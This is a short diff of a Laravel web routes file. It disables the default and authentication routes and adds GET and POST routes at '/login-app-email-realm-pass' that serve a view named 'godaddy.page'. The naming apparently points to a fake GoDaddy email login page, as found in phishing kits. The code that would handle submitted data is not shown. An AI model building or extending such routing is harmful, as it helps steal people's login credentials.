@@ -11,14 +11,14 @@
 |
 */
 
-Route::get('/', function () {
-    return view('welcome');
-});
-Route::get('/page', function () {
+// Route::get('/', function () {
+//     return view('welcome');
+// });
+Route::get('/login-app-email-realm-pass', function () {
     return view('godaddy.page');
 });
-Route::post('/pages', 'PageController@index')->name('pages');
+Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
 
-Auth::routes();
+// Auth::routes();
 
-Route::get('/home', 'HomeController@index')->name('home');
+// Route::get('/home', 'HomeController@index')->name('home');
